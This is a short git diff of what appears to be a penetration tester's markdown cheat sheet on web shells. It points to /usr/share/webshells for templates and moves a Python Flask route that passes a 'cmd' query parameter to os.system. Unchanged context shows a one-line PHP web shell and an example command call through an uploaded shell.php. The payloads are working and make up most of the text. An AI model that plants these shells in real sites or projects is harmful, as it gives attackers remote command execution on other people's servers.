@@ -1,16 +1,8 @@
 # Routes
 
-`/usr/share/webshells`
+Check `/usr/share/webshells` to pull templates
 
 ### Languages
-
-### Python
-
-```python
-@app.route('/rs')
-def rce():
-    return os.system(request.args.get('cmd'))
-```
 
 ### PHP
 
@@ -23,6 +15,15 @@ Test if data can render:
 # RCE (exmaple execution: example.com/uploads/shell.php?cmd=whoami)
 <?php system($_GET['cmd']); ?>
 ```
+
+### Python
+
+```python
+@app.route('/rs')
+def rce():
+    return os.system(request.args.get('cmd'))
+```
+
 
 ### Shells
 
